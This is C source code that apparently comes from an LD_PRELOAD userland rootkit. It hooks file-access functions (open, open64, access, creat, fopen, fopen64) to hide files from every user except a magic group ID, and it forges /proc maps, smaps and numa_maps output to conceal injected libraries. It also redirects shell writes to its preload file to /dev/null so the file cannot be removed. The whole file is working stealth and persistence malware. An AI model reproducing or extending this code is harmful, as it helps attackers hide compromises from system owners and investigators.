int open(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open, "open");
    if(getgid()==MGID) return o_open(pathname, flags, mode);

    if(hxstat(pathname) && strstr(LDSP,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          return o_open("/dev/null", flags, mode);
    }

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname)) { errno = ENOENT; return -1; }
    return o_open(pathname, flags, mode);
}
int open64(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open64, "open64");
    if(getgid()==MGID) return o_open64(pathname, flags, mode);

    if(hxstat(pathname) && strstr(LDSP,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          return o_open64("/dev/null", flags, mode);
    }

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname)) { errno = ENOENT; return -1; }
    return o_open64(pathname, flags, mode);
}
int access(const char *pathname, int amode)
{
    HOOK(o_access,"access");
    if(getgid()==MGID) return o_access(pathname,amode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_access(pathname,amode);
}
int creat(const char *pathname, mode_t mode)
{
    HOOK(o_creat,"creat");
    if(getgid()==MGID) return o_creat(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_creat(pathname,mode);
}
FILE *fopen(const char *pathname, const char *mode)
{
    HOOK(o_fopen,"fopen");
    if(getgid()==MGID) return o_fopen(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_fopen(pathname,mode);
}
FILE *fopen64(const char *pathname, const char *mode)
{
    HOOK(o_fopen64,"fopen64");
    if(getgid()==MGID) return o_fopen64(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return NULL; }
    return o_fopen64(pathname,mode);
}
